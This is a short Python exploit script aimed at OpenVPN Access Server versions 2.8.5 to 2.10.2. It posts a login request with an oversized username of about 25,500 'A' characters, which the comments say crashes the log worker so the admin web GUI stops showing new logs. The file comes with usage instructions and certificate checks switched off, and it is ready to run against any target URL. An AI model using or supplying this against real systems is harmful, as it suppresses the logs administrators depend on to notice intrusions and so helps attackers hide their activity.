#!/usr/bin/env python3
#Issue: Logs will no longer sync with sqlite by sending many characters in the username field of the login post request causing a crash of pyovpn.log.logworker
#Logs will continue to populate in /var/log/openvpnas.log however the admin webgui will no longer show them as they will not be sent to sqlite after the post request
#It is possible to restart the pyovpn.log.logworker process by running ./usr/local/openvpn_as/scripts/sacli stop, and then start
#Confirmed for openvpn-as 2.8.5 - 2.10.2
#Usage: python3 oaslogwrk.py http(s)://openvpninstance.address.com


import sys
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
vpn = str(sys.argv[1])
pload = str("A" * 25547)
h = {"Sec-Ch-Ua": "\"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "text/plain, */*; q=0.01", "X-Openvpn": "1", "X-Requested-With": "XMLHttpRequest", "X-Cws-Proto-Ver": "2", "Sec-Ch-Ua-Platform": "\"Linux\"", "Origin": vpn, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": vpn+"/?src=connect", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
d = {"username": pload, "password": "bangbang"}
s=requests.session()
c=s.cookies
s.get(vpn, headers=h, verify=False)
s.post(vpn+"/__auth__", headers=h, data=d, cookies=c, verify=False)
print("done")
